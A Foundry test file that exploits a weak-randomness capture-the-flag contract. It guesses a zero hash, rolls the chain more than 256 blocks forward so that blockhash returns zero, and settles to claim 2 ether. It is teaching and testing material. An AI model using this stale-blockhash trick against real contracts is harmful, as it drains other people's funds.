
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public challenge;

    function setUp() public {
        vm.deal(address(this), 1 ether);
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockNumber >= 258);
        
        // --- 2. State Configuration ---
        
        address player = makeAddr("player");
        vm.deal(player, 1 ether);
        
        vm.prank(player);
        challenge.lockInGuess{value: 1 ether}(bytes32(0));
        
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        bytes32 predicted = bytes32(0);
                
        uint256 balanceBefore = player.balance;
        vm.prank(player);
        challenge.settle();

        assertEq(player.balance, balanceBefore + 2 ether);
    }
}
